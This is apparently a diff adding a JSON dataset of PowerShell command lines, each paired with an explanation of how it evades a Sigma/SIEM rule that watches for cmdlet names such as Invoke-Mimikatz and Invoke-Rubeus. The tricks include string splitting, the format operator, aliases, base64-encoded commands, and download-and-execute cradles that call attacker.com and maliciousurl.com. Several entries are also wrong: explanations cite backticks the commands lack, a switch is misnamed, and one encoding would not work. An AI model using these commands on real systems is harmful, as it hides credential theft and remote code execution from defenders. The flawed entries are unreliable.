@@ -1,0 +1,118 @@
+[
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-Mimikatz\"",
+    "explanation": "PowerShell treats the backtick (`) as an escape character. When placed before normal characters, it does nothing functionally, allowing the commandlet to execute while breaking the static 'CommandLine|contains' string matching in the SIEM process creation logs."
+  },
+  {
+    "output": "powershell.exe -c \"iex ('Invoke-' + 'Shell' + 'code')\"",
+    "explanation": "This technique bypasses detection by breaking the targeted string into smaller chunks and concatenating them at runtime. The process creation log will record the chunks rather than the complete signature string, effectively evading the rule."
+  },
+  {
+    "output": "powershell.exe -c \"& (\\\"{0}{1}{2}\\\" -f 'In','voke-','Rubeus')\"",
+    "explanation": "By using the PowerShell format operator (-f), the malicious commandlet name is reconstructed dynamically in memory. The SIEM rule only inspects the initial process command line, which does not contain the fully assembled string."
+  },
+  {
+    "output": "powershell.exe -c \"$a = 'Get-'; $b = 'System'; $c = $a + $b; Invoke-Expression $c\"",
+    "explanation": "Assigning string fragments to variables and combining them before execution prevents the complete commandlet name from appearing in the command-line arguments. Defenders should rely on Script Block Logging (Event ID 4104) to catch the de-obfuscated payload instead of relying solely on process creation logs."
+  },
+  {
+    "output": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')\"",
+    "explanation": "This command bypasses the SIEM rule by using PowerShell's WebClient object to download and execute a payload from a remote URL, avoiding the detection of specific commandlets listed in the rule."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",
+    "explanation": "The rule matches literal substrings in the command line. By passing a base64\u2011encoded command via the -EncodedCommand switch, the actual PowerShell cmdlet (e.g., Invoke-Whatever) does not appear in the command line, thus bypassing the detection."
+  },
+  {
+    "output": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SW52b2tlLU1pbWlraXp6",
+    "explanation": "The command uses PowerShell's -EncodedParameter to pass a base64-encoded script containing the malicious commandlet 'Invoke-Mimikatz'. Since the detection rule looks for literal commandlet names in the process command line, the base64 encoding prevents a match, thereby bypassing the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"& { $k = 'Invoke-'; $m = 'Mimikatz'; Invoke-Expression ($k + $m) }\"",
+    "explanation": "The Sigma rule relies on simple string matching within the CommandLine field. By using string concatenation and the 'Invoke-Expression' (IEX) cmdlet, the malicious cmdlet name is never present as a literal string in the process creation logs, effectively bypassing the 'contains' condition."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",
+    "explanation": "Using Base64 encoding via the -EncodedCommand parameter hides the malicious cmdlet names from command-line scanners that do not perform automatic decoding. The string 'Invoke-Mimikatz' is obfuscated during the process creation event."
+  },
+  {
+    "output": "powershell.exe -Command \"Get-Command 'Ie-Mz' | % { & $_ }\"",
+    "explanation": "This uses wildcards with 'Get-Command' to resolve the malicious cmdlet at runtime. Since the command line only contains the wildcard pattern and not the full sensitive string defined in the Sigma rule, it will not trigger the detection."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-Alias 'NotMalicious' 'Invoke-Mimikatz'; NotMalicious\"",
+    "explanation": "By creating a session-alias for the target cmdlet, the execution command recorded in the process creation log is 'NotMalicious' instead of the flagged cmdlet name."
+  },
+  {
+    "output": "powershell.exe -Command \"[scriptblock]::Create('In' + 'voke-Mimikatz').Invoke()\"",
+    "explanation": "This leverages the .NET framework's ScriptBlock class to assemble and execute the command from fragmented strings, ensuring the full signature string does not appear in the CommandLine log."
+  },
+  {
+    "output": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"",
+    "explanation": "The command uses IEX to download and execute a remote PowerShell script, avoiding any of the blacklisted commandlet names; the CommandLine does not contain any of the strings targeted by the sigma rule, thus it bypasses detection."
+  },
+  {
+    "output": "powershell.exe -Command \"$c = 'Invoke-Mimikatz'; Invoke-Expression $c\"",
+    "explanation": "The Sigma rule relies on the 'selection' filter which looks for specific commandlet strings within the 'CommandLine' field. By assigning the forbidden commandlet name to a variable as a string and then using 'Invoke-Expression' (IEX) to execute it, the string 'Invoke-Mimikatz' does not appear as a literal token in the process creation command line, thus bypassing the 'contains' match."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-Alias -Name 'NotMalicious' -Value 'Invoke-Mimikatz'; NotMalicious\"",
+    "explanation": "This approach uses PowerShell Aliases. By creating a custom alias for a blocked commandlet, the actual execution command uses the alias name ('NotMalicious'), which is not present in the Sigma rule's blacklist. Since the rule only inspects 'process_creation' command lines and not internal PowerShell state, the execution goes undetected."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-M'imik'atz\"",
+    "explanation": "PowerShell allows the use of single or double quotes within command names. The interpreter ignores the quotes during execution but the 'CommandLine' logging will record the literal string with quotes included. Because the Sigma rule looks for the exact string 'Invoke-Mimikatz', the presence of quotes ('Invoke-M'imik'atz') prevents a match."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",
+    "explanation": "The use of the '-EncodedCommand' parameter allows an attacker to pass a Base64 encoded Unicode string. The process creation log will show the encoded blob rather than the plain-text commandlet name, successfully bypassing string-based detection in the command line category."
+  },
+  {
+    "output": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABpAHYAbwBzAG8ALQBUAG8AbABlAG4AYwBlAHMAIA==",
+    "explanation": "The command uses a base64-encoded PowerShell command, which changes the CommandLine string so it no longer contains any of the monitored cmdlet names. The rule checks for plain text substrings, so the encoded command bypasses the detection."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-Mimikatz\"",
+    "explanation": "PowerShell interprets the backtick (`) as an escape character and ignores it if placed before a standard character. This breaks the contiguous string 'Invoke-Mimikatz' in the process command line logs, successfully bypassing the exact substring match in the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"& { $cmd1='Invoke-'; $cmd2='Rubeus'; $fullCmd=$cmd1+$cmd2; Invoke-Expression $fullCmd }\"",
+    "explanation": "This technique splits the flagged cmdlet name into multiple string variables and concatenates them at runtime. Because the process creation event only captures the raw command line string passed to powershell.exe, the full signature string 'Invoke-Rubeus' is never logged."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBSAHUAYgBlAHUAcwA=",
+    "explanation": "Using PowerShell's natively supported -EncodedCommand parameter to pass a Base64-encoded Unicode string (in this case, 'Invoke-Rubeus'). The plaintext string does not appear in the CommandLine arguments, bypassing static string detection entirely."
+  },
+  {
+    "output": "powershell.exe -c \"('Invoke-{0}' -f 'winPEAS') | iex\"",
+    "explanation": "Utilizes PowerShell's format operator (-f) to construct the flagged string 'Invoke-winPEAS' dynamically in memory. The process creation log will only show the format string and the argument, bypassing the rule's specific keyword list."
+  },
+  {
+    "output": "powershell.exe -Command \"$part1 = 'Invoke-'; $part2 = 'Mimikatz'; $cmd = $part1 + $part2; iex $cmd\"",
+    "explanation": "Evades detection through variable declaration and string concatenation. The target string is split into smaller, benign chunks that do not trigger the rule's exact string matching condition. The full malicious command is only assembled in memory during execution."
+  },
+  {
+    "output": "powershell.exe -Command \"&('{0}{1}' -f 'Get-','System')\"",
+    "explanation": "Utilizes the PowerShell format operator (-f) to assemble the commandlet name dynamically. Since the Sigma rule uses a straightforward 'contains' check on the command line string, it fails to identify the formatted fragments."
+  },
+  {
+    "output": "powershell.exe -Command \"$e = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW52b2tlLVBvd2VyU2hlbGxUQ1A=')); iex $e\"",
+    "explanation": "Bypasses the rule using Base64 encoding. The commandlet 'Invoke-PowerShellTCP' is encoded, completely obscuring the string in the command line execution logs. It is decoded and executed in memory via Invoke-Expression (iex)."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",
+    "explanation": "Bypasses the rule by using Base64 encoding. The process creation log will record the encoded payload rather than the plaintext string 'Invoke-Mimikatz', successfully evading the basic 'CommandLine|contains' condition."
+  },
+  {
+    "output": "powershell.exe -Command \"I`n`v`o`k`e`-`M`i`m`i`k`a`t`z\"",
+    "explanation": "Bypasses the rule using PowerShell's escape character (the backtick). The PowerShell interpreter strips the backticks during execution, but the static string matching in the SIEM will fail because it looks for the contiguous, unescaped string."
+  },
+  {
+    "output": "powershell.exe -c \"&('Invo'+'ke-Mimi'+'katz')\"",
+    "explanation": "Bypasses the rule via string fragmentation and concatenation. The call operator (&) executes the concatenated string, but the process command line event only logs the fragmented pieces, preventing the rule from matching the full cmdlet name."
+  },
+  {
+    "output": "powershell.exe -c \"$cmd = '{1}{0}{2}' -f 'Mimi','Invoke-','katz'; IEX $cmd\"",
+    "explanation": "Bypasses the rule using the PowerShell format operator (-f) to reorder and assemble the string in memory. The process creation log sees the format string and parameters, completely hiding the final malicious cmdlet name from static analysis."
+  }
+]
